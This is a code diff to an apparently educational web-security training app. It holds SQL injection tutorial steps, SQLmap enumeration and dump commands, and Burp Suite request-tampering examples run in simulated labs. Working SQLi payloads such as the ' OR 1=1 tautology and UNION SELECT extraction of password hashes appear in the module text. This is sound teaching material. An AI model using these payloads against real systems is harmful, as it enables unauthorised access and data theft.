@@ -139,7 +139,7 @@ const MODULES = [
     { title: 'What You Need', desc: 'Nothing to install. A browser with DevTools (<code>F12</code>) is enough to watch requests and responses; Kali ships Firefox (and Burp Suite, covered in a later module) preinstalled for the same job. Everything in this tutorial is practised in the built-in SQLi Practice Lab and standalone SQLi Lab below — no target setup required.', code: null },
     { title: 'Recognise the Vulnerable Pattern', desc: 'SQL injection exists because of string concatenation, not because of any particular framework. Whenever you see user input dropped straight into a query string like this, the WHERE clause can be rewritten by anything you type in the input field:', code: { lang: 'text', text: "-- Server-side pseudocode (vulnerable):\nquery = \"SELECT * FROM users WHERE email = '\" + input_email + \"' AND password = '\" + input_password + \"'\"" } },
     { title: 'Test for Injection with a Single Quote', desc: 'The fastest test for SQLi is breaking the query syntax. In the SQLi Practice Lab below, type a single quote (<code>&#39;</code>) into the email field and submit. If you get a database error or a different response than a normal failed login, the field is concatenating your input unsafely.', code: { lang: 'text', text: "email: '\npassword: anything" } },
-    { title: 'Authentication Bypass with a Tautology', desc: 'The classic payload makes the WHERE clause always true, then comments out the rest of the query so the password check never runs. <code>--</code> is a line comment in MySQL, PostgreSQL and SQLite — MySQL specifically requires a <strong>trailing space</strong> after the two dashes (<code>-- </code>) for it to count as a comment. <code>#</code> is a MySQL-specific inline comment marker; in a URL it must be percent-encoded as <code>%23</code>, since a bare <code>#</code> starts a URL fragment instead of reaching the server.', code: { lang: 'text', text: "email: ' OR 1=1-- \npassword: anything" } },
+    { title: 'Authentication Bypass with a Tautology', desc: 'The classic payload makes the WHERE clause always true, then comments out the rest of the query so the password check never runs. <code>--</code> is a line comment in MySQL, PostgreSQL and SQLite — MySQL specifically requires a <strong>trailing space</strong> after the two dashes (<code>-- </code>) for it to count as a comment. <code>#</code> is a MySQL-specific line comment; in a URL it must be percent-encoded as <code>%23</code>, since a bare <code>#</code> starts a URL fragment instead of reaching the server.', code: { lang: 'text', text: "email: ' OR 1=1-- \npassword: anything" } },
     { title: 'Target a Specific Account', desc: 'A second classic bypass targets one specific account instead of "all rows": comment out the password check entirely after supplying a known or guessed username.', code: { lang: 'text', text: "email: admin@site.com'-- \npassword: anything" } },
     { title: 'Determine the Column Count for UNION', desc: 'Before a UNION-based injection works, the injected SELECT must return the same number of columns as the original query. The reliable way to find it is <code>ORDER BY</code>: start at 1 and increase. Each number up to the real column count sorts normally with no error; the first number <strong>past</strong> the real count throws a "column out of range" style error. The column count is the <strong>last number that did not error</strong> — not that number minus one. (A <code>UNION SELECT NULL,NULL,...</code> probe works differently: any mismatch, too few <em>or</em> too many columns, throws an error; only the exact count succeeds, so there is nothing to subtract there either.)', code: { lang: 'text', text: "' ORDER BY 1--   (no error)\n' ORDER BY 2--   (no error)\n' ORDER BY 3--   (error: Unknown column) -> query has 2 columns" } },
     { title: 'Extract Data with UNION SELECT', desc: 'Once you know the column count, append your own SELECT to pull data the application never meant to show you — here, usernames and password hashes from a users table.', code: { lang: 'text', text: "' UNION SELECT username, password FROM users-- " } },
@@ -252,7 +252,7 @@ const MODULES = [
     { title: 'Identify an Injectable Parameter', desc: 'SQLmap does not find vulnerable parameters out of thin air — you point it at one. Use the manual testing from the SQLi module (a <code>&#39;</code> that breaks the query, or an error you provoked) to confirm a parameter is worth automating, for example a query-string <code>id</code> on a neutral practice target:', code: { lang: 'text', text: 'http://shop.local/item?id=1' } },
     { title: 'Scan a GET Parameter with -u', desc: 'The <code>-u</code> flag gives SQLmap a target URL. With nothing else, SQLmap sends GET requests and tests every parameter in the query string it can find — here, <code>id</code>:', code: { lang: 'bash', text: 'sqlmap -u "http://shop.local/item?id=1"' } },
     { title: 'Testing a POST Body with --data', desc: 'For a login form or any POST endpoint, pair <code>-u</code> with <code>--data</code> — a URL-encoded body string. SQLmap sends it as a POST request and tests every parameter inside the body instead of the query string:', code: { lang: 'bash', text: 'sqlmap -u "http://shop.local/login" --data="email=test@shop.local&password=test"' } },
-    { title: 'Scanning a Saved Request with -r', desc: 'For anything more complex — custom headers, cookies, a JSON body, multiple parameters — building the right <code>--data</code> string by hand gets tedious. The <code>-r</code> flag instead loads a complete raw HTTP request (request line, headers, and body together) straight from a text file, and SQLmap tests every parameter it finds in it. The next module (Burp Suite) lets you save exactly this kind of file from its Proxy or Repeater with "Save item" — for now, you can write one by hand the same way the Proxy Intercept Lab in that module builds one:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\nContent-Length: 46\n\n{"email":"test@shop.local","password":"test"}' } },
+    { title: 'Scanning a Saved Request with -r', desc: 'For anything more complex — custom headers, cookies, a JSON body, multiple parameters — building the right <code>--data</code> string by hand gets tedious. The <code>-r</code> flag instead loads a complete raw HTTP request (request line, headers, and body together) straight from a text file, and SQLmap tests every parameter it finds in it. The next module (Burp Suite) lets you save exactly this kind of file from its Proxy or Repeater with "Save item" — for now, you can write one by hand the same way the Proxy Intercept Lab in that module builds one:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\nContent-Length: 45\n\n{"email":"test@shop.local","password":"test"}' } },
     { title: 'Run Non-Interactively with --batch', desc: 'By default SQLmap pauses and asks a yes/no question at several points (e.g., whether to test a particular technique). <code>--batch</code> tells it to always accept its own suggested default answer instead of waiting for you — essential once you start scripting SQLmap or running it unattended.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
     { title: 'Control Test Depth with --level and --risk', desc: '<code>--level</code> (1–5, default 1) controls how thoroughly SQLmap looks for injection points — higher levels also test cookies, the User-Agent, and Referer headers, not just the obvious GET/POST parameters. <code>--risk</code> (1–3, default 1) controls how aggressive the payloads themselves are — higher risk levels include OR-based payloads that can alter more rows than intended, and heavier time-based queries. Only raise <code>--risk</code> above 1 against a system you are explicitly authorised to test, or the built-in simulator.', code: { lang: 'bash', text: 'sqlmap -r request.txt --level=3 --risk=2 --batch' } },
     { title: 'Enumerate Databases, Tables, and Columns', desc: 'Once SQLmap confirms the injection point, walk the database structure step by step: <code>--dbs</code> lists every database on the server; <code>-D &lt;name&gt;</code> picks one to enumerate further; <code>-T &lt;name&gt;</code> (used with <code>-D</code>) picks a table and lists its columns with <code>--columns</code>; <code>-C col1,col2</code> narrows a later <code>--dump</code> to specific columns instead of the whole table.', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs\nsqlmap -r request.txt -D shopdb --tables\nsqlmap -r request.txt -D shopdb -T users --columns' } },
@@ -320,7 +320,7 @@ const MODULES = [
     { title: 'Browse to Your Target', desc: 'With Intercept on, navigate to any site you own or are explicitly authorised to test. The page will appear to hang — that\'s expected, Burp is holding the request until you act on it. If you don\'t have a live target handy, skip straight to the <strong>Proxy Intercept Practice Lab</strong> below: it simulates this exact intercept → inspect → forward flow entirely offline.', code: null },
     { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw request in the Intercept panel. Study its structure — the request line (method, path, HTTP version), the <code>Host</code> header, <code>User-Agent</code>, any cookies, and the body on a POST.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: shop.local\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
     { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> to send the request on to the server. Click <strong>"Drop"</strong> instead if you want to cancel a request entirely without it ever reaching the server. Either way, check the <strong>HTTP history</strong> sub-tab afterwards to see the request and the server\'s response together — status code, headers, and body.<br><br><strong>Reading a history entry</strong>: the <strong>status line</strong> (e.g. <code>HTTP/1.1 401 Unauthorized</code>) tells you whether the server accepted the request; the response <strong>headers</strong> (e.g. <code>Content-Type</code>, any <code>Set-Cookie</code>) tell you what kind of body follows and whether a new session was issued; the <strong>body</strong> is the actual payload — an HTML page, or a JSON object like <code>{"error":"Invalid email or password"}</code> — and is what you compare between a forwarded-unmodified request and a tampered one to see whether your change actually had an effect.', code: null },
-    { title: 'Modify a Request In-Flight: Reuse Your SQLi Payloads', desc: 'This is the core skill behind every subsequent module: change a value in the raw editor before clicking Forward. Recall the authentication-bypass tautology from the SQLi module — try it here as a login body instead of a form field:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\n\n{"email":"admin@shop.local\'--","password":"anything"}' } },
+    { title: 'Modify a Request In-Flight: Reuse Your SQLi Payloads', desc: 'This is the core skill behind most web attacks: change a value in the raw editor before clicking Forward. Recall the authentication-bypass tautology from the SQLi module — try it here as a login body instead of a form field:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\n\n{"email":"admin@shop.local\'--","password":"anything"}' } },
     { title: 'Test for Logic Flaws: Tampered Price', desc: 'A common vulnerability is trusting the client (browser) to enforce business rules. A checkout UI might refuse to let you type a negative quantity or a zero price, but that is only a client-side restriction — intercept the request that actually submits the order and change the value directly before forwarding it, to see whether the server re-validates it.', code: { lang: 'json', text: '{"productId": 1, "quantity": 1, "price": 0}' } },
     { title: 'Test for Logic Flaws: Spoofed Access-Control Header', desc: 'Some applications make access decisions based on a client-supplied header instead of the actual connection — a classic example is trusting <code>X-Forwarded-For</code> to decide whether a request "came from localhost". Add the header in the raw editor before forwarding and see whether the server\'s response changes:', code: { lang: 'http', text: 'X-Forwarded-For: 127.0.0.1' } },
     { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and choose <strong>"Send to Repeater"</strong>. Repeater lets you replay that exact request as many times as you like, tweaking one value at a time and instantly seeing the new response — without intercepting and re-submitting from the browser each time.', code: null },
@@ -674,7 +674,7 @@ http or dns` } },
 {
   id: 'defenses', track: 'blue', num: 'B3', short: 'defend',
   title: 'Defenses & Remediation',
-  subtitle: 'Defences for every attack topic: the fixes for each red-team module and the blue-team playbooks, in one place.',
+  subtitle: 'Defenses for every attack topic: the fixes for each red-team module and the blue-team playbooks, in one place.',
   tag: 'Blue B3 — Hardening',
 
   concept: [
@@ -885,11 +885,11 @@ function renderModule(mod) {
     ${mod.defense && mod.defense.length ? `
     <p class="defense-link fade-in fade-in-delay-4">
       <span class="defense-icon-sm">${ICONS.shield}</span>
-      <span>Defences for ${escapeHtml(mod.title)}: see the <button type="button" class="defense-link-btn" onclick="window.__app.openDefenseTopic('${mod.id}')">Defenses page</button></span>
+      <span>Defenses for ${escapeHtml(mod.title)}: see the <button type="button" class="defense-link-btn" onclick="window.__app.openDefenseTopic('${mod.id}')">Defenses page</button></span>
     </p>
     ` : ''}
 
-0    <!-- Interactive Reference Table -->
+    <!-- Interactive Reference Table -->
     <div class="section-card fade-in fade-in-delay-5">
       <div class="section-header">
         <div class="section-icon reference">${ICONS.reference}</div>
@@ -1086,7 +1086,7 @@ Ready. Type 'hydra' for usage help.</div>
           <h3 class="section-title">Interactive SQLmap Terminal</h3>
         </div>
         <div class="section-body">
-          <p>Practice SQLmap commands in this simulated environment. Try <code>sqlmap -u "http://target.com/vuln?id=1" --dbs</code> or type <code>sqlmap --help</code> for a full reference.</p>
+          <p>Practice SQLmap commands in this simulated environment. Try <code>sqlmap -u "http://shop.local/item?id=1" --dbs</code> or type <code>sqlmap --help</code> for a full reference.</p>
           <div id="sqlmapSimTerminal" class="terminal-window sim-terminal is-tall">
             <div id="sqlmapSimOutput" class="sim-output">
 <span class="sim-prompt">        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.12#stable}</span>\n|_ -| . [,]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\nCyberCompanion SQLmap Simulator v1.7\nType 'sqlmap --help' for usage, or start scanning.
@@ -1229,7 +1229,7 @@ Ready. Type 'hydra' for usage help.</div>
               </div>
               <div class="sim-panel-body">
                 <h4>Login</h4>
-                <input type="email" id="burpLabEmail" class="sim-field" value="user@company.com">
+                <input type="email" id="burpLabEmail" class="sim-field" value="user@shop.local">
                 <input type="password" id="burpLabPass" class="sim-field" value="mypassword">
                 <button id="burpLabSubmit" class="btn btn-primary">Submit (Intercept ON)</button>
               </div>
@@ -1268,7 +1268,7 @@ Ready. Type 'hydra' for usage help.</div>
       const responseEl = document.getElementById('burpLabResponse');
 
       if (submitBtn) submitBtn.addEventListener('click', () => {
-        const email = emailIn ? emailIn.value : 'user@company.com';
+        const email = emailIn ? emailIn.value : 'user@shop.local';
         const pass = passIn ? passIn.value : 'mypassword';
         const raw = `POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\nContent-Length: ${JSON.stringify({email,password:pass}).length}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\nCookie: token=abc123xyz\n\n${JSON.stringify({email, password: pass}, null, 2)}`;
         if (interceptedArea) interceptedArea.value = raw;
@@ -1293,7 +1293,7 @@ Ready. Type 'hydra' for usage help.</div>
             : '<strong>HTTP/1.1 200 OK</strong><br>{ "access": "granted", "ip_seen": "127.0.0.1" }<br><br><em>The server trusted the spoofed X-Forwarded-For header.</em>';
         } else if (isSQLi || isAdminEmail) {
           responseEl.dataset.state = 'danger';
-          responseEl.innerHTML = '<strong>HTTP/1.1 200 OK</strong><br>{ "authentication": { "token": "eyJhbGciOiJSUzI1NiJ9...", "umail": "admin@company.com" } }<br><br><em>SQLi payload or admin account bypass accepted! You\'re in as admin.</em>';
+          responseEl.innerHTML = '<strong>HTTP/1.1 200 OK</strong><br>{ "authentication": { "token": "eyJhbGciOiJSUzI1NiJ9...", "umail": "admin@shop.local" } }<br><br><em>SQLi payload or admin account bypass accepted! You\'re in as admin.</em>';
         } else {
           responseEl.dataset.state = 'success';
           responseEl.innerHTML = '<strong>HTTP/1.1 401 Unauthorized</strong><br>{ "error": "Invalid email or password" }<br><br>Request forwarded normally. Try modifying the email with a SQLi payload!';
@@ -2000,8 +2000,18 @@ function startSocSimulator() {
   if (panel && !originalRemediationHTML) {
     originalRemediationHTML = panel.innerHTML;
   }
+  if (panel && originalRemediationHTML) {
+    panel.innerHTML = originalRemediationHTML;
+  }
   if (panel) {
     panel.classList.add('locked');
+  }
+  const wafIndicatorStart = document.getElementById('wafStatusIndicator');
+  const wafActionStart = document.getElementById('wafLastAction');
+  if (wafIndicatorStart && wafActionStart) {
+    delete wafIndicatorStart.dataset.state;
+    wafActionStart.textContent = '0 Threats Mitigated';
+    delete wafActionStart.dataset.state;
   }
 
   // Reset terminal
@@ -2486,8 +2496,8 @@ Options:
   -w TIME    : max wait time in seconds (default: 32)
   -s PORT    : specify port
   -f          : exit after first found login/password pair
-  -V          : verbose mode (show each attempt)
-  -v          : very verbose mode
+  -v          : verbose mode
+  -V          : show login+pass for each attempt
   -o FILE    : write found pairs to FILE
   -e nsr     : try "n" null password, "s" login as pass, "r" reversed
 
@@ -2603,7 +2613,7 @@ function handleSqlmapCommand(cmd) {
   terminalEl.scrollTop = terminalEl.scrollHeight;
 
   if (cmd === 'sqlmap --help' || cmd === 'sqlmap -h') {
-    outputEl.innerHTML += `<span class="sim-key">Usage:</span> sqlmap [options]\n\n<span class="sim-key">Target:</span>\n  -u URL             Target URL (e.g. http://site.com/page?id=1)\n  -r FILE            Load HTTP request from file\n\n<span class="sim-key">Detection:</span>\n  --level=LEVEL      Detection level (1-5, default: 1)\n  --risk=RISK        Risk of tests (1-3, default: 1)\n\n<span class="sim-key">Techniques:</span>\n  --technique=TECH   SQL injection techniques (B/E/U/S/T/Q)\n                     B=Boolean, E=Error, U=Union, T=Time\n\n<span class="sim-key">Enumeration:</span>\n  --dbs              Enumerate DBMS databases\n  --tables           Enumerate tables\n  --columns          Enumerate columns\n  --dump             Dump table entries\n  -D DB              DBMS database to enumerate\n  -T TBL             Table to enumerate\n\n<span class="sim-key">Fingerprint:</span>\n  -b, --banner       Retrieve DBMS banner\n  --current-user     Retrieve current DB user\n  --current-db       Retrieve current DB\n\n<span class="sim-key">Examples:</span>\n  sqlmap -u "http://target.com/item?id=1" --dbs\n  sqlmap -u "http://target.com/item?id=1" -D shopdb --tables\n  sqlmap -u "http://target.com/item?id=1" -D shopdb -T users --dump\n`;
+    outputEl.innerHTML += `<span class="sim-key">Usage:</span> sqlmap [options]\n\n<span class="sim-key">Target:</span>\n  -u URL             Target URL (e.g. http://site.com/page?id=1)\n  -r FILE            Load HTTP request from file\n\n<span class="sim-key">Detection:</span>\n  --level=LEVEL      Detection level (1-5, default: 1)\n  --risk=RISK        Risk of tests (1-3, default: 1)\n\n<span class="sim-key">Techniques:</span>\n  --technique=TECH   SQL injection techniques (B/E/U/S/T/Q)\n                     B=Boolean, E=Error, U=Union, T=Time\n\n<span class="sim-key">Enumeration:</span>\n  --dbs              Enumerate DBMS databases\n  --tables           Enumerate tables\n  --columns          Enumerate columns\n  --dump             Dump table entries\n  -D DB              DBMS database to enumerate\n  -T TBL             Table to enumerate\n\n<span class="sim-key">Fingerprint:</span>\n  -b, --banner       Retrieve DBMS banner\n  --current-user     Retrieve current DB user\n  --current-db       Retrieve current DB\n\n<span class="sim-key">Examples:</span>\n  sqlmap -u "http://shop.local/item?id=1" --dbs\n  sqlmap -u "http://shop.local/item?id=1" -D shopdb --tables\n  sqlmap -u "http://shop.local/item?id=1" -D shopdb -T users --dump\n`;
     terminalEl.scrollTop = terminalEl.scrollHeight;
     return;
   }
@@ -2616,14 +2626,14 @@ function handleSqlmapCommand(cmd) {
 
   const hasUrl = /-u\s+["']?https?:\/\//i.test(cmd);
   if (!hasUrl && !cmd.includes('-r ')) {
-    outputEl.innerHTML += `<span class="sim-err">No target URL specified. Use: sqlmap -u "http://target.com/page?id=1"</span>\n`;
+    outputEl.innerHTML += `<span class="sim-err">No target URL specified. Use: sqlmap -u "http://shop.local/page?id=1"</span>\n`;
     terminalEl.scrollTop = terminalEl.scrollHeight;
     return;
   }
 
   const urlMatch = cmd.match(/-u\s+["']?(https?:\/\/[^\s"']+)["']?/i);
-  const targetUrl = urlMatch ? urlMatch[1] : 'http://target.com/vuln?id=1';
-  const targetHost = escapeHtml(targetUrl.split('/')[2] || 'target.com');
+  const targetUrl = urlMatch ? urlMatch[1] : 'http://shop.local/vuln?id=1';
+  const targetHost = escapeHtml(targetUrl.split('/')[2] || 'shop.local');
   const hasDbs = cmd.includes('--dbs');
   const hasTables = cmd.includes('--tables');
   const hasDump = cmd.includes('--dump');
@@ -2679,7 +2689,7 @@ function handleSqlmapCommand(cmd) {
       outputEl.innerHTML += `\n[*] fetching columns for table '${tblFlag}' in database '${dbFlag}'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[4 columns]\n+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| id       | int(11)      |\n| email    | varchar(200) |\n| password | varchar(300) |\n| role     | varchar(50)  |\n+----------+--------------+\n`;
     }
     if (hasDump && dbFlag && tblFlag) {
-      outputEl.innerHTML += `\n[*] fetching entries of column(s) 'email,password,role' for table '${tblFlag}' in database '${dbFlag}'\n[*] recognized possible password hashes in column 'password'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[3 entries]\n+---------+-----------------------------+----------+\n| id      | email                       | role     |\n+---------+-----------------------------+----------+\n| 1       | <span class="sim-err">admin@company.com</span>           | <span class="sim-key">admin</span>    |\n| 2       | alice@company.com           | user     |\n| 3       | bob@company.com             | user     |\n+---------+-----------------------------+----------+\n\n<span class="sim-ok">table dumped to '/root/.local/share/sqlmap/output/${targetHost}/dump/${dbFlag}/${tblFlag}.csv'</span>\n`;
+      outputEl.innerHTML += `\n[*] fetching entries of column(s) 'email,password,role' for table '${tblFlag}' in database '${dbFlag}'\n[*] recognized possible password hashes in column 'password'\nDatabase: ${dbFlag}\nTable: ${tblFlag}\n[3 entries]\n+---------+-----------------------------+----------+\n| id      | email                       | role     |\n+---------+-----------------------------+----------+\n| 1       | <span class="sim-err">admin@shop.local</span>           | <span class="sim-key">admin</span>    |\n| 2       | alice@company.com           | user     |\n| 3       | bob@company.com             | user     |\n+---------+-----------------------------+----------+\n\n<span class="sim-ok">table dumped to '/root/.local/share/sqlmap/output/${targetHost}/dump/${dbFlag}/${tblFlag}.csv'</span>\n`;
     }
     if (!hasDbs && !hasTables && !hasDump && !hasColumns && !hasBanner && !hasCurrentUser && !hasCurrentDb) {
       outputEl.innerHTML += `\n[*] <span class="sim-key">Tip:</span> Vulnerability confirmed! Now enumerate with:\n    --dbs              (list databases)\n    -D shopdb --tables (list tables)\n    -D shopdb -T users --dump  (dump user table)\n`;
